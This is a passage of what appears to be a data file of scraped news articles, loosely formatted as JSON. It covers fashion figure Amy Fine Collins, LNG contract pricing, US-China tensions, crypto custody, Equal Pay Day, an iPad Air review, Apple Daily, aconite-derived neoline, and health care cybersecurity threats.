      "text": "Before there were influencers, there were people who acted as \u201cmuses\u201d to fashion designers and photographers. Amy Fine Collins is one of those people. Collins worked at House & Garden , Harper\u2019s Bazaar , and finally Vanity Fair , where she spent over 20 years writing about style, culture, and the fashion industry. Designer Geoffrey Beene considered her a close friend and muse until his death in 2004. She\u2019s one of four people Eleanor Lambert bequeathed her infamous International Best Dressed List to and as one would imagine, she\u2019s just as particular about her own personal style as she is about what makes it on the list. \n\u201cThere\u2019s also something very graphic and definite about my look,\u201d Fine Collins said, backstage just before her live interview with Fern Mallis , the creator of New York Fashion Week and host of Fashion Icons with Fern Mallis at 92Y in New York City. \n\u201cIt\u2019s not quite severe but it\u2019s not soft and gentle,\u201d she continued. \u201cI\u2019m told often that people find me intimidating. My thought is: Why are you so insecure? It\u2019s just an effect that I can have. But, I often feel like I look like a drawing.\u201d \nFine Collins transitioned her glamorous role at Vanity Fai r during Cond\u00e9 Nast\u2019s glory days into an editor-at-large position at Airmail, the newsletter of former Editor-in-chief Graydon Carter. She also wrote a book, The International Best Dressed List: The Official Story . So what happens to the \u201cBest Dressed List\u201d in the age of Instagram? Is it better to just go viral? \u201cI think people want to become memes,\u201d she said. \u201cIt happened to me one year at the Costume Institute.\u201d \nIt was 2017. She was wearing a Thom Browne trompe-l\u2019\u0153il; an illusion of a red evening gown . The other side was a man\u2019s black tux. \u201c This was before Billy Porter did it ,\u201d she said. \u201cThere was a meme comparing it to someone who was on Drag Race .\u201d But the gown, she reiterated, was exquisite. \nAs a rule, Fine Collins only wears clothing designed by friends. \u201cClothing is so personal. The maker has such a connection to his creation. It merges sensibility, stories, and narratives,\u201d she explained. \u201cI know so much what Thom [Browne] feels and what he thinks and why he does what he does.\u201d Browne plays a lot with androgyny; and because Fine Collins has short hair and what she describes as a slim, muscular figure, she said it\u2019s a perfect match. \nBut only wearing pieces designed by her friends has not cut down on the amount of clothing in her closet. \u201cI ran out of space ages ago,\u201d she confirmed. There are things in her country home, her mother\u2019s basement, and racks where she says they shouldn\u2019t be. She refuses to use a storage unit because she needs to have \u201cpigments on my palette within reach.\u201d \nFine Collins will never reach for sweatpants, though. \u201cIf I had to run out and grab a cup of coffee and I didn\u2019t feel like getting dressed, I would get dressed,\u201d she laughed. \u201cOr I would have the coffee delivered and be in my pajamas.\u201d \nThe commitment to her personal presentation paid off. So much so that she says she was often photobombed when legendary street style photographer Bill Cunningham would take her picture for the New York Times . \u201cIt was so important for so many people to be on that page and they never quite understood that it wasn\u2019t about the person,\u201d she said. \nThe same can be said not just for the International Best Dressed List, but of Fine Collins\u2019 work at Vanity Fair . She hopes as younger people discover her work, they understand how much work went into her larger-than-life stories. \u201cOne of the complaints I hear about 18, 19, 20-year-olds, is that they want it right away,\u201d she said. \u201cEverything is work. Part of the skill of being a good anything is doing so much work, but making it look effortless\u201d \u2014 not unlike the way Fine Collins gets dressed. \nLike what you see? How about some more R29 goodness, right here?",

      "title": "LNG industry gets flexible on pricing during Shanghai meet",
      "text": "Energy bigwigs headed to Shanghai this week for a once-every-three-years liquefied natural conference, where they debated the rise of China as a mega-buyer, the role of the US as a major supplier and what the current price crash means. \nBut the hottest topic of LNG2019 was how sellers are cooking up novel ways to price the fuel to meet the spectrum of customer demands while also competing with coal and oil. \nThe LNG market has come a long way from its traditional structure of decades-long contracts between buyers and sellers. \nAmid the rapid expansion of suppliers, demand and spot trading, the historical price link to crude oil has been challenged. \nThis week saw some new alternatives. \nFrance\u2019s Total SA announced that it had agreed to buy gas from Tellurian Inc\u2019s Driftwood LNG project for 15 years at a price based on the Japan-Korea Marker, the Asian benchmark. \nThat\u2019s a departure from the usual practice for projects in the US using the domestic Henry Hub benchmark. \nWhile Henry Hub-based accords are backed by a heavily traded futures market, they\u2019ve proven less popular with many buyers in Europe and Asia because prices are driven by factors unique to North America. \nBut Royal Dutch Shell Plc stole the show with an even more unusual price combo: a 20-year deal to buy LNG from NextDecade Corp\u2019s Rio Grande project at a price linked to Brent crude, a departure from the Henry Hub basis that US projects have extolled for years. \nThat left Total chief executive officer Patrick Pouyanne scratching his head. \u201cContinuing to price gas linked to oil is somewhat the old world,\u201d he said. \u201cI was most surprised to see new contracts linked to Brent, especially from the US. Someone will have to explain this to me.\u201d \nAfter the conference broke up Friday, attention turned to Tokyo, where Shell and one of its customers, Tokyo Gas Co, announced what they said is the world\u2019s first LNG contract using a pricing formula that includes coal indexation. \nLinking LNG supplies to the price of coal as well as oil and gas will help stabilise Tokyo Gas\u2019s cost exposure, Toshio Kawamura, a general manager at the company, said in a briefing. This is \u201ca risk management strategy for somebody who is competing with coal-fired generation in the home market,\u201d said Christopher Goncalves, chair of the energy practice at Berkeley Research Group. \u201cThat is attractive in places which have a lot of coal-fired generation, such as China, India and Japan.\u201d \nAs US and Chinese negotiators inch toward a trade agreement, all eyes in Shanghai were on new deals between America\u2019s biggest LNG exporter, Cheniere Energy Inc, and buyers in China. \nBut anyone expecting an accord to be signed during the conference would have been disappointed. \nLNG is perhaps the best example of trade that would benefit both countries. \nChina is the world\u2019s fastest-growing market for the super-chilled fuel, which it wants to use in place of coal to fight pollution. \nAnd the US, buoyed by booming gas production from shale, and could become the world\u2019s biggest exporter. \nBut LNG has become caught up in the wider trade dispute between the two countries, with China imposing a 10% retaliatory duty on US imports in September. \nA supply deal between Cheniere and China Petrochemical Corp, known as Sinopec, is awaiting a resolution of trade tensions. \nThe companies had been in talks for almost a year when progress stalled as the Trump administration escalated the trade war, people familiar with the situation said last month. \nIt seems Cheniere will just have to wait for President Trump and his Chinese counterpart, Xi Jinping, to end the spat. \nThe US company is ready sign on the dotted line, but the delays are coming from Chinese customers and regulators, it said. \n\u201cWe are not going to slow down,\u201d CEO Jack Fusco said. \u201cTheir approval process is between them and their regulatory agencies.\u201d \nWhile some North American developers are racing to get their LNG projects online, Chevron Corp and its partner Woodside Petroleum Ltd may see some upside in not having one of the first export facilities out of the gate. \nThe two companies have expanded the capacity of their proposed Kitimat project in British Columbia by as much as 80%, but they won\u2019t be competing with Shell\u2019s LNG Canada venture, which is planning a similar plant nearby. Shell has already decided to proceed with the $30bn project, and that leaves Chevron and Woodside to build \u201cat the back end of the construction period so that we can pick up that workforce and take advantage of the work that\u2019s already been done,\u201d Woodside CEO Peter Coleman said in a Bloomberg TV interview. \nChevron and Woodside have been burned before. \nThey\u2019re partners on the Gorgon and Wheatstone LNG ventures, two giant export facilities in Western Australia that cost a combined $88bn, way over their initial budgets, and dominated both companies\u2019 capital expenditure plans for a decade.",

      "title": "DAVID IGNATIUS: How Xi overplayed his hand",
      "text": "WASHINGTON \nIn the rebalancing of Sino-American relations that's underway, the usual roles are reversed: China's normally deft President Xi Jinping appears to have badly overreached in seeking advantage. And President Trump, who often seems tone-deaf on foreign policy, is riding a bipartisan consensus that it's time to push back against Beijing. \nThe two nations will probably make a trade deal soon, patching together a working relationship that has been frayed by a year of tariffs and economic brinksmanship. Experts predict an agreement that will boost U.S. exports to China, improve market access for American firms and reduce the power of Chinese state-owned enterprises -- and offer some modest new legal protections for American companies whose commercial secrets have been plundered by Beijing for a half-century. \nBut as Xi jockeyed for position against America, many U.S. experts argue that he misplayed his hand. After decades of what was known as a \"hide and bide\" strategy of cautious cooperation, the Chinese leader moved to directly challenge American primacy in technology. This eventually triggered a sharp, bipartisan American response, which Trump has harvested. \n\"In an incredibly divided Washington, one of the only areas of agreement is that China policy needs to be less accommodating and more resolute toward Beijing,\" says Kurt Campbell, who oversaw Asia policy in the Obama administration. He credits Trump for recognizing Xi's weakness: \"China is not yet ready to take on the U.S., and Trump recognizes this.\" \nThe Chinese-American confrontation is partly a spy story, but very different than the cloak-and-dagger escapades of the Cold War: China operates its espionage net partly through universities, research institutes and benign-sounding recruitment plans. Until recently, American companies often didn't realize that their pockets had been picked until it was too late. \nChina's over-aggressive strategy dates back to the 2008 financial crisis, which Beijing saw as \"a strategic window of opportunity for China to become a global superpower,\u201d according to Greg Levesque, managing director of Pointe Bello consultants. Using internal Chinese documents, he recently explained to a congressional commission how China targeted \"key core technologies\" in the West. \nAn innovative early feature was the \"Thousand Talents Plan,\" established by Beijing in 2008. The program sought to recruit \"global experts,\" in particular those with Chinese ancestry, to join what the plan's website called \"National Key Scientific and Technological Projects.\" By 2014, says the website, more than 4,180 overseas experts had been recruited. \nThe strategy was formalized in Xi's announcement two years ago of \"Made in China 2025,\" a roadmap for dominating key technologies such as artificial intelligence, quantum computing and biopharmaceuticals. Xi mobilized China's nominally private companies through an approach known as \"Military-Civil Fusion.\" \nThe system for recruiting overseas talent was explained by an article posted April 16, 2018, by a Communist Party organization at Wuhan University People's Hospital, describing how cadres there created an \"Overseas Talent Recruitment Station\" at a gathering in Dallas of Chinese-American medical researchers. \nA Wuhan party official told the Dallas group that he \"hoped that more overseas talent would return to the motherland and develop\" high-tech projects. (The article was shared with me by a U.S. security-consulting firm.) \nBill Priestap, the FBI's former head of counterintelligence, described the \"Thousand Talents Program\" in congressional testimony last December as an example of \"non-traditional espionage.\" He said the goal was \"luring both Chinese overseas talent and foreign experts alike to bring their knowledge and experience to China, even if that means stealing proprietary information.\" \nThe problem for the Chinese is that this so-called \"brain gain\" effort was so aggressive that it backfired. The New York Times reported this week that the FBI has recommended denying visas to some Chinese academics suspected of having ties to Chinese intelligence. The Energy Department recently banned anyone involved in China's talent-recruiting programs from working in DOE laboratories. \nThere's blowback in the trade negotiations, too. Lorand Laskai of the Council on Foreign Relations noted last year that the Trump administration mentioned \"Made in China 2025\" more than 100 times in its Section 301 trade complaint against Beijing. A newly wary China has stopped referring to the Thousand Talents Plan or mentioning award recipients, according to recent reports by Bloomberg News and Nature, respectively. \nThe Trump administration still doesn't have a consistent, comprehensive strategy for dealing with China. Among other things, it lacks a coherent regional economic framework, like the Trans-Pacific Partnership agreement that Trump scuttled. But now is the right time to confront China's bad behavior, before Beijing gets any stronger, and Trump has the political wind at his back. \nDavid Ignatius is a columnist for The Washington Post.",

Diogo Monica is president and co-founder of Anchorage, crypto\u2019s premier custodian for institutional investors. \nThe last few years have seen the formation of many crypto-focused hedge funds and venture capital funds, whose collective assets under management total in the billions of dollars: institutional investors including Blockchain Capital, BlockTower, Paradigm and Polychain, among others. These funds know the blockchain ecosystem as well as anyone in the world. \nWe\u2019re grateful institutional investors who know crypto best are helping to inform the development of our custody product. Clients tell us what they need, and we partner with them to build what they require. Through this process, we\u2019ve learned some lessons worth sharing because they offer meaningful insight into the crypto space and how it\u2019s evolving. \n1. Institutional investors want more from their custodian \nBecause digital assets are bearer assets, most investment activities involve handling the underlying private keys. This means custody plays a much bigger role in crypto investors\u2019 day-to-day operations than in traditional finance. Whatever investors want to do with their assets \u2013 buy and hold, exit a major position, actively trade, participate in staking and governance \u2013 the custodian will be involved. \nAs such, institutional investors want custodians to make buying and selling digital assets as easy and painless as possible. What\u2019s typically a multi-step process, including navigating exchanges and OTC dealers, finding the best price, manually transferring crypto from or to custody, is ripe for disruption by custodians. Regulated trading involves custody and custody relies on technology, which means providing even simple financial services (like the ability to buy, hold and sell an asset) requires highly advanced underlying infrastructure in the custody function. \nFunds and institutions should be able to focus on their investment strategies without having to worry about security or moving millions of dollars in crypto between addresses. The onus is on custodians to enable their clients to sell or buy directly through custody. \n2. Cold storage isn\u2019t working for institutional use cases \nInstitutional investors are painfully aware of the major hot wallet breaches our industry has suffered and the chilling effect they\u2019ve had on the whole ecosystem. To counteract the risks of online exposure, custodians have attempted to secure assets by generating and managing keys entirely offline through a manual human process called \u201ccold storage.\u201d Holding assets offline is necessary for security purposes, but institutional investors are frustrated with cold storage as it has traditionally been implemented. \nQuestioning the practicality of cold storage is not something we at Anchorage take lightly: As project leads for the Glacier Protocol , my co-founder and I helped develop a step-by-step method for bitcoin self-custody that relies on cold storage. Cold storage has been instrumental for the broader adoption of decentralized currencies, allowing people with non-technical backgrounds to safely store their crypto assets offline. It was and continues to be a sensible custody solution for many retail investors. \nBut cold storage comes with serious usability constraints, and institutional investors have complex usability needs that cold storage simply cannot satisfy. \nFor one, institutional investors have an obligation to their LPs to generate as much yield as possible on their behalf. Cold storage is an impediment to institutions\u2019 ability to quickly execute trades. When a time-sensitive trading opportunity arises, custodians must be able to ensure that a client\u2019s assets are readily accessible for trading at a moment\u2019s notice. Traditional forms of cold storage can entail hours or even days of waiting to withdraw assets, at which point trading opportunities are lost. Institutional custody providers must develop solutions that make offline assets easily accessible and securely tradeable. \nSecond, institutional investors are demanding staking and governance, two forms of on-chain participation that require the use of private keys for online operations. Some cold storage custodians rely on delegation and proxy contracts, technologies that enable one key or contract to act on behalf of another. But not all projects allow delegated staking, and proxy contracts can increase surface-of-attack and introduce unnecessary risk. \nAs more projects come to market with mechanisms requiring active participation, institutional investors, which have a major stake in their investments\u2019 health and success, will rely on their custodians to act accordingly and get the most out of their holdings. \n3. Institutional investors require solutions designed for multi-person teams \nThe fact that institutional funds are managed collectively presents its own set of challenges. While \u201cnot your keys, not your crypto\u201d has become a common refrain among adherents to the value of self-sovereignty, which individual should ultimately control crypto keys owned by an institutional fund? \nWe believe the keys must be controlled by a multi-person team. Providers are using different solutions to achieve this result: some use Shamir\u2019s Secret Sharing (a cryptography algorithm that divides keys into multiple parts), others use physical controls. We at Anchorage associate a unique key with each user and require all sensitive operations to be signed by a quorum of user keys. \nBut multi-person approval is only part of the solution. The custodian must verify institutional intent \u2013 in other words, the custodian must ensure that a given operation represents what the client organization wants to do, and not just what a rogue individual or rogue group wants to do. We believe institutional intent is best verified by authenticating each human approver for a given operation, not just verifying possession of a shard or user key; and by enabling institutional investors to configure customizable quorums based on the nature of the operation, since different team members may have different domains of authority. \nIn sum, the role of custodians is evolving as the crypto ecosystem matures. \nInstitutional investors have different needs than retail users, while new coins that offer staking and governance demand on-chain participation. If the first wave of custody solutions was designed to help individuals hold and trade bitcoin, then the second wave will be trained on satisfying the needs of institutions and enabling full participation in all cryptocurrencies. \nDisclosure Read More \nThe leader in blockchain news, CoinDesk is a media outlet that strives for the highest journalistic standards and abides by a strict set of editorial policies .

      "text": "[Want to get New York Today by email? Here's the sign-up .] \nIt\u2019s Tuesday. The Queens Library is changing its name to the Queens Public Library. Why? \u201cTo reinforce who is at the center of our work and to whom the library belongs,\u201d a library spokeswoman told me. Its new tagline: \u201cWe speak your language.\u201d \nWeather: Bundle up. The day will start with a wind chill that makes it feel like the low 30s. Warmer this afternoon, but the wind will get even stiffer. There\u2019s a chance of rain tonight. \nAlternate-side parking : In effect until April 18 (Holy Thursday). \nImage \nToday is Equal Pay Day, which represents how far into the current year the average American woman must work to earn what the average man did in the previous year. \nThis pay gap sits on top of all the other financial disparities women face, from health insurance and transportation costs to dry cleaning prices. \nWomen of all races and ethnicities who work full time, year-round in the United States are paid 80 cents for every dollar their male counterparts earn, according to United States Census Bureau data analyzed by the American Association of University Women . \nThe association also says women in New York State earn 88 percent of men\u2019s salaries. (Its website even breaks down the gender wage gap by congressional district: Find yours here .) \nIn New York City, a 2018 report by the city comptroller\u2019s office highlighted the gap for black and Latin women. Black women working full time earn 57 cents \u201cfor every dollar paid to white, non-Hispanic men,\u201d the report says. For Latinas, that figure is 49 cents. \nThat means for many women of color, Equal Pay Day is months away. You can see a breakdown at EqualPayToday.org . \nHere are some myth busters about the gender wage gap. \nResearch shows that the gap does not exist purely because of job choice or because women take time off to care for children; it\u2019s much more complicated. \nHow do we know? By comparing women and men with equal experience. \nAnd yes, the wage gap has slowly narrowed in the United States. At its current rate, it will close for the average woman by 2059, the Institute for Women\u2019s Policy Research predicts . \nWhat might close the gap? \n\u2022 Employers can offer pay transparency . When salaries are known, the wage gap shrinks. \n\u2022 Managers asking job applicants for salary history may perpetuate the pay gap. Also, it\u2019s illegal to ask about it in New York City. \n\u2022 Women are asking for more money, but it\u2019s important to note, as Otegha Uwagba did last month in New York magazine\u2019s The Cut, that they are \u201cmore likely to be refused or suffer blowback for daring to broach the topic.\u201d \n[Read more women, gender and society in The Times\u2019s In Her Words newsletter .] \nCalling All Regulars \nImage \nDoes the waiter know your name?

      "title": "Apple iPad Air 2019 review: happy medium",
      "text": "A good step up from the basic iPad \nThere sure are a lot of different iPads now. Last week\u2019s announcement of a new iPad Air and iPad mini means that Apple\u2019s tablet lineup includes five different screen sizes, each of which has its own storage or LTE options on top of that. Apple has an iPad at price points that range from $329 for a basic iPad all the way up to (an absurd) $1,899 for a maxed-out 12.9-inch iPad Pro . \nIf you\u2019re trying to choose among them, you might think that\u2019s too many iPads, but I think there\u2019s a surprising amount of coherency to the lineup. More importantly, there\u2019s a clear standout best choice for people looking to get more than the basics without spending iPad Pro prices. That choice, if you haven\u2019t guessed, is the new iPad Air. \nStarting at $499, the iPad Air brings all of the features that actually matter to most people down to a price point that\u2019s much more reasonable. It\u2019s also just an excellent tablet on its own merits, but you probably could have guessed that on your own. \nIt is, after all, an iPad. \nThe new iPad Air feels instantly familiar. It has the same basic iPad form factor we\u2019ve been living with for years and years. The screen is surrounded by bezels that look large in 2019 but really aren\u2019t too bad, with a physical Touch ID button on one side and a camera on the other. The back is tapered to the edges, making the whole thing feel thinner, and I really like that there\u2019s no camera bump to speak of. \nWhat\u2019s \u201cnew\u201d about the Air is the screen size: 10.5 inches. That\u2019s slightly bigger than the basic iPad, but it\u2019s exactly the same size as the old (and now-discontinued) 10.5-inch iPad Pro from 2017. That means the body is slightly larger than traditional 9.7-inch iPads \u2014 not enough to really feel but just enough to make your old cases incompatible. \nThe screen is great, though. It\u2019s a clear step up from the basic iPad and not just because of the slightly larger size. It\u2019s laminated to the glass, which means that there\u2019s nearly no air gap between where you touch and where the pixels are. It also supports Apple\u2019s True Tone technology, which adjusts the color temperature of the screen to the lighting in the room you\u2019re in. It\u2019s subtle, but it really works, and I really do miss it when I look at another screen. \nThe theme of the iPad Air is that it takes the features you actually would have wanted from an iPad Pro and brings them down to a more reasonable price point. That absolutely applies to the screen. The Pro-level iPads have two things this iPad Air lacks: larger, fancy curved-corner screens and Apple\u2019s ProMotion technology for varying the display\u2019s refresh rate to make scrolling ultra smooth. Both of those things are very nice, but neither is the sort of thing I\u2019d tell you to spend hundreds of dollars more to get. \nI came to this iPad Air after a couple of years of using that old 10.5-inch iPad Pro, and it\u2019s so similar that I hardly noticed the change. There is one thing that\u2019s disappointing by comparison, though: the speakers. Apple reserves having four speakers (two on each side) for the Pro models, and it was weird to only have sound coming out of the right-hand side while watching movies. \nIn fact, if you can find that (now-discontinued) 10.5-inch iPad Pro for a discount (or at the same price), I\u2019d probably recommend that you snap it up instead of this iPad Air. It\u2019s basically the same thing but with a couple extra speakers. (I think the processor difference is a wash.) \nThe iPad Air has the same A12 processor as the latest iPhones, and in use, that means everything felt snappy and fluid, even when multitasking. Battery life has been really great, too. There are cameras. They are definitely fine, but not good or bad enough to worry about. (Your phone cameras are almost surely better.) The iPad\u2019s cameras are perfectly adequate for \u201cscanning\u201d pictures of documents, which is where they make the most sense anyway. You really don\u2019t need me to tell you much more about what the experience and performance is like because it\u2019s great. It\u2019s an iPad. \nThat said, I still think iOS 12 doesn\u2019t make the case that it can replace your Mac or Windows laptop, but that conflict isn\u2019t as angsty on the Air as it is on the Pro. At this price, you don\u2019t really have to worry about all of that. We\u2019ll argue about this all over again when iOS 13 comes out, but until then, let the iPad Pro people kvetch about it. \nThe other formerly \u201cPro-only\u201d feature you get on the iPad Air is a keyboard connector. I still think it\u2019s dumb that the basic iPad still requires a Bluetooth keyboard, so I\u2019m really glad it\u2019s available here. It uses the old \u201cOrigami\u201d-style Smart Keyboard, which still costs a whopping $159. It\u2019s not backlit, but it\u2019s great to type on (better than a MacBook!), and I love that it allows you to position the iPad in both easel and drawing modes. The new iPad Pros can\u2019t do that, which is nuts. \nYou also get support for the Apple Pencil, but it\u2019s the first-gen Pencil with its silly cap, silly charging method, and silly proclivity to roll off any surface you set it on. The Pencil still retails for $99, too. It works well with this iPad, but if you really want a stylus and don\u2019t think you\u2019ll miss the pressure sensitivity, I think the Logitech Crayon might make more sense. \nA word about the Lightning connector: I think the vast majority of people who will buy this iPad Air will be very happy that it uses Lightning and not USB-C. They likely will have iPhones or will be upgrading from an older iPad, and so they will have one less new cable to worry about. Lightning is a great plug: it\u2019s small and durable and simple. \nI am not in that majority, though. It\u2019s silly to claim that USB-C is a \u201cPro\u201d feature reserved for \u201cPro\u201d iPads. It\u2019s a common plug now on a wide variety of devices from headphones to laptops to every single modern Android phone. I understand why Apple didn\u2019t want to inflict that transition on potential iPad Air customers, but I also would like the entire industry to just get this transition done and over with. Lightning is great, but it would be even better if I could use the same fast-charging cable and brick I use to charge my MacBook to charge this iPad. \nSpeaking of ports, the iPad Air has an honest-to-goodness headphone jack. As it should. \nBefore this Air, buying an iPad led to a difficult choice. The basic iPad was (and is) very good, but if you wanted to step up and get something with a keyboard connector, the Pro used to start at $649. Now, the Air is a very obvious and very reasonable upsell. At $499, you get almost all of the \u201cPro\u201d features that really matter in day-to-day use. \nCompared to the new Pro, these bezels on the Air sure are big, and not having Face ID on an iOS device is starting to feel a little antiquated. But those futuristic hardware features don\u2019t really do that much more for people, and you\u2019ll only miss them if you already have an iPad Pro. The only thing you\u2019re missing out on is having a tablet that feels like it comes from the future. It doesn\u2019t mean the tablet you have today isn\u2019t excellent. \nWith the iPad Air, most of the features that most people really want from a Pro machine become available without paying Pro prices. The iPad Air floats in the middle of the iPad lineup, and if you can afford it, you should get it over the basic iPad. \nI initially had a lot of questions about what \u201cAir\u201d meant after Apple brought back the moniker for this iPad and the MacBook Air. But after using this iPad, I think I finally get it. This what Air is supposed to mean now: the best all-around choice for most people. \nVox Media has affiliate partnerships.

      "text": "(MENAFN - Asia Times) Hong Kong media maverick Jimmy Lai is used to being counted out. Shares of his media flagship have lately tumbled to historic lows while he struggled to reverse five years of consecutive losses at his popular but unprofitable Apple Daily. \nLately he has resorted to promoting a subscription model similar to that of the New York Times. Then suddenly his newspaper was the talk of the town when Apple Daily published a juicy story that generated a huge amount of traffic. \nIt came in the form of a video clip of singer Andy Hui Chi-on , husband of Canto Pop queen Sammi Cheng Sau-man , seen kissing and cuddling young TVB actress Jacqueline Wong Sam-wing , whose boyfriend is Kenneth Ma Kwok-ming , also a TVB actor. \nThe 16-minute video clip , complete with apparent intimacy and unexpected dialogue, quickly went viral and dominated social media platforms in Hong Kong, China (where Facebook and Apple Daily are banned but the video and story featured on the popular WeChat app) and North America (where Apple has an app). \nThe mix of celebrity and intimacy between public figures with positive images captured the public's attention, but it also sparked concerns over privacy and hidden cameras. \nThe source of the video, perhaps filmed by a taxi or Uber driver, is unclear. How it came to be leaked is also unknown, as is whether or not Apple Daily paid for it. Quite a few Apple rivals fired shots at Mr Lai for shamelessly running, if not paying, for the story. \nIn any case, the story gave fresh impetus to Apple Daily's subscription plan just as it started a campaign to get customers to sign up for a plan that is currently free, but will require payment from later in the year, perhaps in October. \nThe juicy story, which attracted more than 100,000 \"likes\" on the Apple Daily website, reportedly brought in more than 200,000 subscribers, taking those enrolled in the subscription service to over two million. \nIt also saw Next Digital's shares temporarily shoot up 22% at the opening of trading on Wednesday before falling back in the afternoon. \nApple Daily is a classic case of how a local media giant has suffered from its repeated attempts to monetize its huge online traffic. Hong Kong's top news website, with over 5 million total unique visitors, is losing around HK$20 million (US$2.55 million) a month. \nWorse still, the paper has been blacklisted, not just by mainland Chinese companies, but also by other major corporations who do not want to be viewed unfavorably by Beijing because of the paper's anti-establishment, pro-democratic editorial approach. \nNow it remains to be seen whether the maverick's publication can get a second chance to prove that its back-to-basics, human-interest approach can become a life-saver for the struggling media giant. \nMENAFN1704201901590000ID1098401581",

      "title": "Active ingredient of aconite root against peripheral neuropathic pain is identified as neoline",
      "text": "Aconite root is used in East Asian traditional medicines to treat pain. Since its toxicity, it is used after heat-processing for detoxifying. The present study revealed that processed aconite root could relief neuropathic pain in murine peripheral neuropathy model induced by oxaliplatin, paclitaxel, or partial ligation of the sciatic nerve (Seltzer model), and identified that its active ingredient is not benzoylmesaconine, a degraded compound of toxic mesaconitine, but neoline, a stable compound by detoxifying heat-processing. \nThe root of Aconitum carmichaeli (Ranunculaceae), is a crude drug used in traditional Chinese or Japanese kampo medicine to treat pain associated with coldness. Since aconite root is highly toxic, processing methods for detoxifying have been developed, and toxic ingredients such as aconitine and mesaconitine degrade into benzoylaconine and benzoylmesaconitine by heat-processing. Although the analgesic activity and the toxicity of mesaconitine is strong, those of benzoylmesaconitine are about 1,000-fold weaker than mesaconitine. However, in traditional medicine, processed aconite root has been used for various pain in clinic. \nThe present study revealed that processed aconite root could relief neuropathic pain in murine peripheral neuropathy model induced by intraperitoneal injection of oxaliplatin, paclitaxel, or the partial ligation of the sciatic nerve (Seltzer model), and identified that its active ingredient is neoline. In the plasma samples of rats treated with processed aconite root, higher concentrations of benzoylmesaconine and neoline were apparent among Aconitum alkaloids. Subcutaneous injection of benzoylmesaconine did not attenuate the hyperalgesia in mice models. Neoline is a stable compound by heat-processing of aconite root. The present results indicate that processed aconite root and its active ingredient, neoline, are promising agents for the alleviation of neuropathic pain. \nStory Source: \nMaterials provided by Nagoya City University .

      "title": "Health care\u2019s huge cybersecurity problem",
      "text": "Cyberattacks aren\u2019t just going after your data \nThe patient lying on the emergency room table in front of Paul Pugsley was having a stroke. Time was running out. Pugsley, an emergency medicine resident at Maricopa Medical Center, knew he needed to send the patient for a CT scan. \nBut when Pugsley looked over at the computer screen at the side of the room, he saw a pop-up message demanding bitcoin payment. A few minutes later, he was told that the same message had shut down the scanner \u2014 he\u2019d have to help the patient without knowing whether the stroke was caused by a bleed or a clot, information that\u2019s usually vital to the course of treatment. \nAfter a few minutes of frantic workarounds, the patient \u2014 actually a medical test dummy \u2014 was wheeled out the room (prognosis: survival, but serious brain damage). The flashing ransom note was part of a simulation, designed to expose physicians like Pugsley to the very real threat of cyberattacks on their hospitals. \nReports show that ransomware and other cyberattacks are on the rise \u2014 and health care is one of the biggest targets . Just this week, researchers in Israel announced that they\u2019d created a computer virus capable of adding tumors into CT and MRI scans \u2014 malware designed to fool doctors into misdiagnosing high-profile patients, Kim Zetter reports for The Washington Post . Despite the rising threat, the vast majority of hospitals and physicians are unprepared to handle cybersecurity threats, even though they pose a major public health problem. \nThe health care industry increasingly relies on technology that\u2019s connected to the internet: from patient records and lab results to radiology equipment and hospital elevators. That\u2019s good for patient care, because it facilitates data integration, patient engagement, and clinical support. On the other hand, those technologies are often vulnerable to cyberattacks, which can siphon off patient data, hijack drug infusion devices to mine cryptocurrency, or shut down an entire hospital until a ransom is paid. \n\u201cIf systems are disrupted over the internet, by an adversary or an accident, that can have a profound impact on patient care,\u201d says Beau Woods, a cybersecurity advocate and cyber safety innovation fellow with the Atlantic Council. \nImage: SecureList / AO Kaspersky Lab \nThe case Pugsley faced in the simulation mimicked the spring 2017 WannaCry cyberattack , which infected thousands of computers and crippled the United Kingdom\u2019s National Health Service. In 2017, the Health Care Industry Cybersecurity Task Force convened by the US Department of Health and Human Services concluded that health care cybersecurity was in \u201ccritical condition.\u201d Experts say that health care lags far behind other industries, like the financial sector, in the way it protects its information technology infrastructure. And unlike finance, a health care failure can end with injury or even death. \nThere\u2019s no evidence that any patients died as a direct result of WannaCry. But the attack crippled thousands of hospital computers and pieces of diagnostic equipment \u2014 forcing doctors to ferry lab results across hospitals by hand and cancel nearly 20,000 patient appointments . The attack targeted vulnerabilities in the Microsoft Windows operating system, encrypting data and holding computer systems for bitcoin ransom. While WannaCry was eventually stymied , Woods says health care institutions continue to be vulnerable to attacks of that magnitude. \n\u201cI want to raise the alarm without being alarmist,\u201d Woods says. \u201cThe preconditions for something bad to happen are there. We know there\u2019s kindling on the ground, we just don\u2019t know what match is going to light it.\u201d \nBillions of threats \nNotPetya was one of the largest cyberattacks of all time. The June 2017 attack caused $10 billion in damage to companies and crippled computers around the world, from Tasmania to Copenhagen \u2014 including those at the Massachusetts-based medical transcription service Nuance . The company\u2019s systems were shut down for weeks, which left thousands of health care delivery organizations, including Sutter Health, a Northern California health care system, unable to use its programs. \nSutter Health, which serves over 3 million patients, was prepared. They were able to quickly respond to the attack and move off of the system, says chief privacy and information security officer Jacki Monson. But within a day, it still had a backlog of over 1 million files that needed to be transcribed. \n\u201cIt could have easily created a patient safety issue \u2014 if you have transplant patients, or patients who are having surgery, you need all those medical notes,\u201d she says. \nSutter Health deals with countless cyberattacks daily. It was hit with around 87 billion cyber threats in 2018, according to Monson, and uses artificial intelligence technology to sort and evaluate them. \u201cWe prioritize them \u2014 a human couldn\u2019t look at that many billions.\u201d Based on the nature of the threat, the team might apply software patches, or block an email address that they expect a phishing attack to come from. \nThe number of threats Sutter Health faces is likely on the high end, due to the size of the system, Monson says \u2014 but the number would still be in the billions for any hospital or health care delivery organization. And it only takes one threat to break through. \u201cMost organizations with an active cyberattack in their system don\u2019t discover it for 18 months or longer,\u201d Monson says. \u201cIt\u2019s not a measure of when or if \u2014 it\u2019s probably already happening and you just don\u2019t know it.\u201d \nSutter Health\u2019s robust cybersecurity program, though, is an exception rather than the rule. Most hospitals don\u2019t have the resources to monitor threats to their systems, and many might not even be aware that they\u2019re something to be concerned about. \nMedical device manufacturers and the Food and Drug Administration are well aware of the challenges around health care cybersecurity: the FDA has guidelines around how medical device makers should manage security risks both before and after products are put on the market, and hosted a workshop on device cybersecurity at the end of January. At the workshop, a group of device makers (including big names like Abbott and Medtronic) committed to working closely with hackers and security researchers on vulnerabilities. \nBut hospitals and physicians haven\u2019t kept pace with that progress. \u201cWe have good tools in the middle of the supply chain, at the FDA level, with manufacturers,\u201d Woods says. \u201cWe don\u2019t see it at the actual point of delivering care.\u201d \nThe costs of black boxes \nThe technologies inside of hospitals vary widely: some medical devices are new, but others are made by companies no longer in business, or run on old software with gaping security holes. Pacemakers and other implanted, internet-connected devices are hackable . Human 